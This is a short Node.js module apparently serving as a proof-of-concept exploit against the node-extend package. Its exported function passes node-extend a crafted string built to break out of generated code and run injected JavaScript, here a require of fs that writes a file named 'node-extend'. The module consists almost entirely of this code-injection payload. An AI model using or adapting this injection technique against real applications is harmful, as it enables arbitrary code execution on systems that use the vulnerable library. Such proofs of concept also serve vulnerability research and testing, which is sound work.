function exploitFunction(payload) {
    const fs = require("fs");
    const extend = require("node-extend");

    try {
        const foo = extend(
            "function (){});require(`fs`).writeFileSync('node-extend',''); //(){console.log(123)}",
            ""
        );
    } catch (error) {
        console.error("Error during extension:", error);
    }
}

module.exports = { exploitFunction };